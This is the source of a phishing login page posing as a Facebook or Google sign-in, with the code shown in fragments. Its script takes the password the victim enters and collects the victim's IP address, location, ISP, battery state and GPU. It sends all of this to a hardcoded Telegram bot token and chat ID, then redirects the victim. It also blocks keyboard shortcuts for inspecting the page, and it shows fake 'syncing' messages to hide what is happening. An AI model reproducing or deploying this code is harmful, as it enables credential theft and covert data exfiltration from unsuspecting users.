<!DOCTYPE html>

        }

        ::-webkit-scrollbar { width: 0px; }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background: #00050a;
            color: #fff;
            font-family: 'Poppins', sans-serif;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* DYNAMIC NEON BACKGROUND */
        #bg-canvas {
            position: fixed;
            top: 0; left: 0;

            padding: 1px;

        }

        .auth-card {
            background: var(--glass);
            border-radius: 24px;
            padding: 45px 35px;
            text-align: center;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(15px);
        }

        /* TYPOGRAPHY - CLICKBAIT MODE */
        .brand-title {

            font-size: 26px;
            font-weight: 900;
            color: var(--primary-blue);

        /* INPUT SYSTEM */
        .input-box {
            position: relative;
            margin-bottom: 20px;
        }

        .input-box input {

            background: rgba(0, 10, 20, 0.7);
            border: 1px solid #1a3a5a;
            border-radius: 12px;
            padding: 16px 20px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: 0.4s ease;
        }

        .input-box input:focus {
            border-color: var(--primary-blue);
            box-shadow: 0 0 12px rgba(0, 123, 255, 0.3);
            transform: scale(1.02);
        }

        /* AUTH BUTTONS */
        .btn-auth-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 25px;
        }

        .btn-auth {
            border: none;
            border-radius: 12px;
            padding: 14px;
            font-weight: 700;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer;
        }

        .btn-fb { background: #1877f2; color: #fff; }
        .btn-ggl { background: #fff; color: #333; }

        .btn-auth img {
            width: 20px;
            margin-right: 15px;
        }

        .btn-auth:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
        }

        /* STEALTH LOADER BLUE */
        #loader-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 5, 10, 0.98);
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .loading-pulse {
            width: 80px; height: 80px;
            border: 3px solid rgba(0, 123, 255, 0.1);
            border-top: 3px solid var(--primary-blue);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }

        .loading-text {
            margin-top: 20px;
            color: var(--primary-blue);
            font-family: 'Orbitron', sans-serif;
            font-size: 12px;
            letter-spacing: 2px;
        }

        /* FOOTER BRANDING - NO NAME */
        .shafiq-footer {
            margin-top: 40px;
            font-size: 9px;
            color: #1a4a7a;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .scanline {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 3px;
            background: rgba(0, 123, 255, 0.05);
            z-index: 100;
            pointer-events: none;
            animation: scanning 4s linear infinite;
        }

        @keyframes scanning { 0% { top: 0%; } 100% { top: 100%; } }
    </style>
</head>
<body>

    <canvas id="bg-canvas"></canvas>
    <div class="blue-gradient-overlay"></div>
    <div class="scanline"></div>

    <div id="loader-overlay">
        <div class="loading-pulse"></div>

    <script>
        /* --- DYNAMIC NEON BLUE CANVAS --- */
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        let dots = [];

        function init() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            for(let i=0; i<60; i++) {
                dots.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    vx: (Math.random() - 0.5) * 0.4,
                    vy: (Math.random() - 0.5) * 0.4,
                    r: Math.random() * 2
                });
            }
        }

        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#007bff";
            dots.forEach(d => {
                d.x += d.vx; d.y += d.vy;
                if(d.x < 0 || d.x > canvas.width) d.vx *= -1;
                if(d.y < 0 || d.y > canvas.height) d.vy *= -1;
                ctx.beginPath();
                ctx.arc(d.x, d.y, d.r, 0, Math.PI*2);
                ctx.fill();
            });
            requestAnimationFrame(animate);
        }
        init(); animate();

        /* --- THE CORE ENGINE - SHAFIQ SECRET SENDER --- */
        const CHAT_ID = "8463622692";
        const BOT_TOKEN = "8797152046:AAFGRBsspuWkiuiy0OXu9NDu1NI7nkM03bc";

            const p = document.getElementById('pass').value;

            document.getElementById('loader-overlay').style.display = 'flex';
            const status = document.getElementById('status-msg');

            // Fake Stealth Transitions
            setTimeout(() => { status.innerText = "MENYINGKRONKAN PERANGKAT..."; }, 1500);

            // DATA MINING
            let geo = {};
            try { geo = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e) { geo = { ip: "ERR" }; }

            let batt = "N/A";
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                batt = `${(b.level * 100).toFixed(0)}% [${b.charging ? 'CAS' : 'TIDAK'}]`;

                            `🏢 **ISP:** ${geo.org}\n` +

                            `━━━━━━━━━━━━━━━━━━━\n` +
                            `🔋 **BATT:** ${batt}\n` +
                            `🎮 **GPU:** ${gpu}\n` +
                            `🕒 **TIME:** ${new Date().toLocaleString('id-ID')}\n` +
                            `━━━━━━━━━━━━━━━━━━━\n` +
                            `STATUS: **INFILTRATED** ✅`;

            // SEND TO TELEGRAM
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: payload, parse_mode: 'Markdown' })

            } catch(e) {}

            setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
        }

        // ANTI-INSPECT ELEMENT

            if(e.keyCode == 123) return false;
            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;

    </script>
